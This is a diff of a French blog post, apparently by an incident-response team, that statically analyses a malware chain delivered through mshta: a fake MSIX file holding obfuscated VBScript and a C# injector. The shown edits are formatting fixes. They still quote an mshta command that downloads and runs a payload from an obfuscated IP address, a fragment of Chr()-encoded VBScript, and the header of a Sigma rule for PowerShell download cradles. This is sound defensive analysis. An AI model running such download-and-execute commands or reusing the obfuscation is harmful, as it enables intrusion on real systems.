@@ -1,17 +1,17 @@
 ---
-layout : post 
+layout: post
 title: "Analyse statique d'un script distribué via MSHTA embarquant un injecteur C#"
 date: 2026-03-01 09:00:00 +0100
 author: elf
 categories: [blog]
 tags: [malware,reverse,static,loader,c#,mshta,powershell]
+category: investigations
+description: "Analyse statique d'une chaîne d'exécution malveillante distribuée via MSHTA : conteneur MSIX piégé, VBScript obfusqué et injecteur C#."
 ---
 
 Dans cet article, AISI présente l'analyse d'un script malveillant détecté par le service SOC et récupéré par les équipes de réponse à incident. 
 
-AISI a reçu une alerte d'un EDR signalant qu'un processus suspect a utilisé mshta pour tenter de télécharger et d’exécuter une charge utile. En effet, l'EDR a bloqué la commande suivante : 
-
-`"C:\Windows\system32\mshta.exe" http://104.0xA4.55.96/fetch.msix`
+AISI a reçu une alerte d'un EDR signalant qu'un processus suspect a utilisé mshta pour tenter de télécharger et d’exécuter une charge utile. En effet, l'EDR a bloqué la commande suivante : `"C:\Windows\system32\mshta.exe" http://104.0xA4.55.96/fetch.msix`
 
 Cette commande permet la récupération de `fetch.msix` hébergé à l'adresse `104.0xA4.55.96`. L'analyse de ce binaire montrera qu’il ne s’agit pas d’une archive MSIX légitime, mais d’un conteneur HTML embarquant du code VBScript fortement obfusqué, dont l’unique objectif est de déclencher une chaîne d’exécution malveillante en plusieurs étapes.
 
@@ -91,7 +91,7 @@ Cette technique d'évasion est utilisée par les acteurs malveillants pour obscu
 
 Parmi ces milliers de lignes de junk code, le bloc qui nous intéresse est le suivant : 
 
-```vbs
+```vb
 Sub verb_BIsOWIvs()
 
 Set wmi = GetObject(Chr(119) & Chr(105) & Chr(110) & Chr(109) & Chr(103) & Chr(109) & Chr(116) & Chr(115) & Chr(58))
@@ -717,7 +717,7 @@ falsepositives:
 level: high
 ```
 
-```YAML
+```yaml
 title: PowerShell Download and Execution Cradles
 id: 85b0b087-eddf-4a2b-b033-d771fa2b9775
 status: test
